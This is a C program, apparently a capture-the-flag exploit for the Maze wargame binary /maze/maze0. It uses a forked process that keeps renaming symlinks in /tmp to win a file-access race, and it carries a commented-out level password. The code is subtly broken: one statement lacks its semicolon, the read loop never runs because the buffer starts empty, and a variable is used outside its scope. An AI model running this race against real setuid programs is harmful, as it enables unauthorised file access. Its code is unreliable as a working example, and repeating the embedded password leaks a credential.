#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/wait.h>

#define FOLDERPATH "test"
#define DIFFERENTPATH "thisfucker"

// password LEEoYer8i9 

void touch (char* filename, mode_t mode)
{
    int fild = open(filename, O_WRONLY|O_CREAT, mode);
    assert(fild >= 0);
    close(fild);
}
/*
    single symlink point to two thing
    this works only if we can rename stuff
    symlink 
    /     \
   /       \
 file1     file2

    next plan is to create two symlink and then

              /     \
             /       \
            /         \
        symlink1    symlink2
          /             \
         file1          file2
*/

int main(int argc, char *argv[])
{
    char* symlink_name1 = "/tmp/128ecf542a35ac5270a87dc740918404";
    char* symlink_name2 = "thisB";

    char* file1 = "fileeer1";
    char* file2 = "fileeer2";
    char* targetstr = "/tmp/" FOLDERPATH "/%s";

    asprintf(&file1, targetstr, file1);
    asprintf(&file2, targetstr, file2);
    asprintf(&symlink_name2, targetstr, symlink_name2)

    touch(file1, 0777);
#ifdef DIFFERENTPATH
    touch(file2, 0777);
#endif

    symlink(file1, symlink_name1);
    symlink(file2, symlink_name2);

    if (fork() == 0)
    {
        char* tmpfile = "temp";
        for (;;)
        {
            rename(symlink_name1, tmpfile);
            rename(symlink_name2, symlink_name1);
            rename(symlink_name1, symlink_name2);
            rename(tmpfile, symlink_name1);
        }
    }
    else
    {
        char buffer[0xff] = { 0 };
        while (*buffer)
        {
            FILE* mazefilp = popen("/maze/maze0", "r");
            assert(mazefilp != NULL);

            fscanf(mazefilp, "%s", buffer);
            pclose(mazefilp);
        }

        printf("%s\n", buffer);
        remove(tmpfile);
        remove(file2);
        remove(symlink_name2);

        wait(0);
    }
    free(file1);
#ifdef DIFFERENTPATH
    free(file2);
#endif
    return 0;
}